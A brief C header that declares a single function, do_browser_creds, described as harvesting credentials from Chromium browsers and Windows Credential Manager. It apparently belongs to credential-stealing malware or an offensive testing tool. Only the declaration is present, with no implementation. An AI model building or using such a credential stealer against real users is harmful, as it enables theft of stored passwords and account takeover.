#pragma once
/* Browser credential harvesting: Chromium browsers + Windows Credential Manager.
 * Returns malloc'd string, caller must free(). Never returns NULL. */
char* do_browser_creds(void);
